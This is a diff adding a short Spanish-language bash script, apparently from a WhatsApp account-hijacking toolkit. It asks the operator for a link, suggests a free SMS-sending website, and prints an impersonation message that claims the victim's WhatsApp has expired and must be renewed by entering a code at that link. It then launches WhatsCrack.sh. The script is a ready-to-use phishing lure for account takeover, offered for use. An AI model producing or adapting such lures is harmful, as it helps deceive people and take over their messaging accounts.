@@ -1,0 +1,15 @@
+bash .banner
+echo "Introduce el eblace que deseas mandar:"
+read input
+bash .banner
+echo "[Para mandar sms gratis hay una pagina llamada https://globfone.com/send-text/]"
+echo ""
+echo "Mandales este sms que lees a continuacion:"
+echo ""
+echo "WhatsApp: Su WhatsApp a caducado para reestavlecerlo"
+echo "necesitamos que ingrese el codigo de renovacion aqui:"
+echo "$input"
+echo ""
+echo "Precione una tecla para continuar..."
+read input1
+bash WhatsCrack.sh
